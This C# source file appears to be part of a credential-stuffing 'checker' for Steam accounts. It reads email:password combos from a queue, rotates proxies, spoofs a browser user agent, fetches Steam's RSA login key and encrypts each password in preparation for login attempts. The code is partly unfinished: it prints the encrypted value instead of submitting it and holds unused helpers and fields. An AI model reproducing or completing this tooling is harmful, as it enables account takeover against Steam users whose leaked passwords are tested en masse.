using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web;
using AuthGG;
using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using ZuttPal;
using Console = Colorful.Console;
using StringContent = System.Net.Http.StringContent;

namespace ZuttPal
{
	internal class check15
	{
		public static string Path;
		private static ReaderWriterLockSlim locker = new ReaderWriterLockSlim();



        public static void startchecker2()
        {
        	for (; ; )
        	{
        		while (!Checking18.Combo.IsEmpty)
        		{
        			using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
        			{
        				if (Checking18.Combo.TryDequeue(out string acc))
        				{
                            try
                            {
                                CookieStorage cookieStorage = new CookieStorage();
                                httpRequest.Cookies = cookieStorage;
                                var array = acc.Split(new char[3] { ':', ';', '|' });
                                var email = array[0];
                                var password = array[1];
                                httpRequest.Proxy = Checking19.RandomProxies();
                                httpRequest.IgnoreProtocolErrors = true;
                                httpRequest.KeepAlive = true;
                                httpRequest.ConnectTimeout = Program.config.timeout;
                                httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                                httpRequest.SslProtocols = System.Security.Authentication.SslProtocols.Tls12;
                                if (!httpRequest.Get("https://store.steampowered.com/login/?l=english").ToString().Contains("<title>Login</title>"))
                                {
                                    Interlocked.Increment(ref Checking18.retry);
                                }
                                else
                                {
                                    httpRequest.Referer = "https://help.steampowered.com/en/wizard/Login?redir=%2Fen%2F";
                                    string input1 = httpRequest.Post("https://help.steampowered.com/en/login/getrsakey/", "username=" + email, "application/x-www-form-urlencoded").ToString();
                                    string mod = Regex.Match(input1, "publickey_mod\":\"(.*?)\"").Groups[1].Value;
                                    string exp = Regex.Match(input1, "publickey_exp\":\"(.*?)\"").Groups[1].Value;
                                    string str1 = Regex.Match(input1, "timestamp\":\"(.*?)\"").Groups[1].Value;
                                    string str2 = check15.RSAEncryption(password, mod, exp);
                                    Console.WriteLine(str2);
                                }
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine("[»] ERROR - " + e, Color.Orange);
                                var array = acc.Split(new char[3] { ':', ';', '|' });
                                var email = array[0];
                                var password = array[1];
                                var account = email + password;
                                string acc1 = email + ":" + password;
                                Checking18.Combo.Enqueue(acc1);
                                Interlocked.Increment(ref Checking18.retry);
                                break;
                            }
        				}	
        			}
        		}
        	}
        }
        public static string RSAEncryption(string strText, string mod, string exp)
        {
            string text = "<RSAKeyValue><Modulus>" + check15.HexString2B64String(mod) + "</Modulus><Exponent>" + check15.HexString2B64String(exp) + "</Exponent></RSAKeyValue>";
            var testData = Encoding.UTF8.GetBytes(strText);

            using (var rsa = new RSACryptoServiceProvider(1024))
            {
                try
                {               
                    rsa.FromXmlString(text.ToString());

                    var encryptedData = rsa.Encrypt(testData, true);

                    var base64Encrypted = Convert.ToBase64String(encryptedData);

                    return base64Encrypted;
                }
                finally
                {
                    rsa.PersistKeyInCsp = false;
                }
            }
        }
        public static string yey(string source, string left, string right)
		{
			return source.Split(new string[]
			{
				left
			}, StringSplitOptions.None)[1].Split(new string[]
			{
				right
			}, StringSplitOptions.None)[0];
		}
		public static void Save(string path, string line)
			{
			for (; ; )
			{
				try
				{
					File.AppendAllLines(path ?? "", new List<string>
					{
						line
					}, Encoding.UTF8);
					break;
				}
				catch
				{
				}
			}
		}
        public static byte[] conv(string string_1)
        {
            byte[] array = new byte[string_1.Length / 2];
            for (int i = 0; i < array.Length; i++)
            {
                array[i] = Convert.ToByte(string_1.Substring(i * 2, 2), 16);
            }
            return array;
        }

        public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        public static string rsa(string string_1, string string_2, string string_3)
        {
            string.Concat(new string[]
            {
        "<RSAKeyValue><Modulus>",
       Base64Encode(string_2),  
        "</Modulus><Exponent>",
       Base64Encode(string_3),
        "</Exponent></RSAKeyValue>"
            });
            byte[] bytes = Encoding.UTF8.GetBytes(string_1);
            string result;
            using (RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024))
            {
                try
                {
                    rSACryptoServiceProvider.ImportParameters(new RSAParameters
                    {
                        Modulus = conv(string_2),
                        Exponent = conv(string_3)
                    });
                    byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, false);
                    result = Convert.ToBase64String(inArray);
                }
                finally
                {
                    rSACryptoServiceProvider.PersistKeyInCsp = false;
                }
            }
            return result;
        }
        public static byte[] HexStringToHex(string inputHex)
		{
			byte[] numArray = new byte[inputHex.Length / 2];
			for (int index = 0; index < numArray.Length; ++index)
				numArray[index] = Convert.ToByte(inputHex.Substring(index * 2, 2), 16);
			return numArray;
		}

		public static string HexString2B64String(string input) => Convert.ToBase64String(check15.HexStringToHex(input));
		public static string uri = "";

		public static string auther = "";

		public static string printbad = "";

		public static string printlocked = "";

		public static List<string> Tokens = new List<string>();

		public static List<string> Urls = new List<string>();

		public static List<string> Auther = new List<string>();

		public static List<ProxyClient> ProxyList = new List<ProxyClient>();
	}
}
